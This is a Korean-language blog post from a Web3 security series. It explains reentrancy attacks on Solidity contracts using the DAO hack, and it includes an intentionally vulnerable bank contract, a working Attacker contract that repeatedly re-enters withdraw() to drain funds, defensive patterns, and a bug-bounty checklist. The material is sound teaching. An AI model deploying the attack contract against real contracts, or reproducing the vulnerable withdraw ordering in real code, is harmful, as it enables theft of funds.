---
layout: post
title: "Web3 시리즈 #11 — Reentrancy Attack"
date: 2026-04-10
categories: [web3-security]
tags: [reentrancy, the-dao, security, exploit]
---

## The DAO 해킹 — 이더리움을 둘로 나눈 사건

**2016년 6월.** The DAO라는 투자 펀드 컨트랙트에서 **360만 ETH (당시 약 6000만 달러)**가 탈취되었습니다.

충격이 너무 커서 이더리움 커뮤니티가 "해킹 전 상태로 되돌리자" vs "코드가 법이다"로 나뉘었고, 결국 **하드 포크**로 이더리움(ETH)과 이더리움 클래식(ETC)이 분리되었습니다.

이 공격의 이름이 **Reentrancy(재진입) Attack**입니다.

---

## 취약한 코드

```solidity
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "No balance");
        
        // 1. 먼저 ETH를 전송합니다
        (bool success, ) = msg.sender.call{value: bal}("");
        require(success, "Transfer failed");
        
        // 2. 그 다음 잔고를 0으로 초기화합니다
        balances[msg.sender] = 0;
    }
}
```

문제가 보이시나요?

1번(ETH 전송)과 2번(잔고 차감)의 **순서**가 문제입니다.

---

## 공격 과정

```solidity
contract Attacker {
    VulnerableBank public bank;
    
    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }
    
    function attack() external payable {
        bank.deposit{value: 1 ether}();  // 1 ETH 예치
        bank.withdraw();                  // 인출 시작
    }
    
    // ETH를 수신할 때 자동으로 호출되는 함수
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();  // 재진입하여 다시 인출!
        }
    }
}
```

### 실행 흐름

```
Attacker: withdraw() 호출
  └→ Bank: bal = 1 ETH (잔고 확인) ✅
  └→ Bank: Attacker에게 1 ETH 전송
       └→ Attacker의 receive() 자동 실행
            └→ Attacker: withdraw() 재호출!
                 └→ Bank: bal = 1 ETH (아직 0으로 초기화되지 않음!) ✅
                 └→ Bank: 1 ETH 재전송
                      └→ Attacker의 receive() 재실행
                           └→ withdraw() 재호출...
                                └→ Bank 잔고가 소진될 때까지 반복
```

**잔고를 0으로 초기화하기 전에 ETH를 전송하기 때문에**, receive()에서 다시 withdraw()를 호출해도 **잔고가 아직 남아있는 것처럼** 처리됩니다.

---

## 왜 "Reentrancy"인가?

> 함수 실행이 완료되기 전에 **다시 진입(re-enter)**하기 때문입니다

```
withdraw() 시작 → ETH 전송 → receive() → withdraw() 재진입!
                                          ↑ 첫 번째 호출이 아직 완료되지 않은 상태
```

---

## 방어 방법 3가지

### 1. Checks-Effects-Interactions 패턴 (CEI)

```solidity
function withdraw() public {
    uint256 bal = balances[msg.sender];
    require(bal > 0);           // Check

    balances[msg.sender] = 0;   // Effect (상태를 먼저 변경합니다!)

    (bool success, ) = msg.sender.call{value: bal}("");  // Interaction
    require(success);
}
```

**상태를 먼저 변경하고, 그 다음에 외부 호출을 수행합니다.** 이렇게 하면 재진입해도 잔고가 이미 0입니다.

### 2. ReentrancyGuard (뮤텍스 잠금)

```solidity
// OpenZeppelin의 ReentrancyGuard
bool private locked;

modifier nonReentrant() {
    require(!locked, "Reentrant call");
    locked = true;
    _;
    locked = false;
}

function withdraw() public nonReentrant {
    // locked = true인 동안 재진입 불가
    uint256 bal = balances[msg.sender];
    require(bal > 0);
    
    (bool success, ) = msg.sender.call{value: bal}("");
    require(success);
    
    balances[msg.sender] = 0;
}
```

### 3. transfer() / send() 사용 (권장하지 않음)

```solidity
// 2300 gas만 전달 → 재진입에 필요한 가스 부족
payable(msg.sender).transfer(bal);
```

가스 제한에 의존하는 방어 방식으로 **권장하지 않습니다.** EIP-1884 이후 가스 비용이 변경될 수 있어 신뢰성이 낮습니다.

---

## 변종: Cross-function Reentrancy

같은 함수가 아닌 **다른 함수**를 통해 재진입하는 경우입니다.

```solidity
contract Vulnerable {
    mapping(address => uint) public balances;
    
    function withdraw() public {
        uint bal = balances[msg.sender];
        (bool success, ) = msg.sender.call{value: bal}("");
        require(success);
        balances[msg.sender] = 0;
    }
    
    function transfer(address to, uint amount) public {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}
```

공격자의 receive()에서 `withdraw()` 대신 `transfer()`를 호출해 잔고를 다른 주소로 옮길 수 있습니다.

**CEI 패턴만으로는 방어되지 않을 수 있습니다.** ReentrancyGuard가 더 안전한 이유입니다.

---

## 버그 바운티에서 찾아볼 것

코드를 읽을 때 다음을 확인하세요:

1. **외부 호출 후 상태 변경** — CEI 패턴 위반
2. **`call{value: ...}("")`** — ETH를 전송하는 지점
3. **`nonReentrant` modifier 누락** — 특히 ETH/토큰을 다루는 함수
4. **크로스 컨트랙트 호출** — 다른 컨트랙트를 호출한 후 상태를 변경하는 경우

---

## 정리

- Reentrancy = 함수 실행 중 재진입하여 상태 불일치를 악용하는 공격
- The DAO 해킹으로 이더리움이 분리될 만큼 큰 파급력
- 방어: **CEI 패턴** + **ReentrancyGuard** 조합
- 변종(Cross-function, Cross-contract, Read-only)도 존재합니다
- "외부 호출 → 상태 변경" 순서를 항상 의심하세요

---

> **다음 편:** Access Control 취약점 — 관리자 함수를 누구나 호출할 수 있다면 어떻게 될까요?
